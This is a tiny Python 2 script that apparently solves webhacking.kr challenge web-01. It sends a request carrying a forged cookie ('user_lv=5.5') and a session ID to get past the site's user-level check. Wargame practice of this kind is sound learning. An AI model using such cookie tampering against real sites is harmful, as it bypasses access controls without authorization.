import requests

url = "http://webhacking.kr/challenge/web/web-01/index.php"

# request header
# dictionary
headers = {
	# key : value
	"Host": "webhacking.kr",
	"Cookie": "user_lv=5.5; oldzombie=1; PHPSESSID=c603acca73669c676d425537a0ae53d9"
}

req = requests.get(url, headers=headers)

print req.content
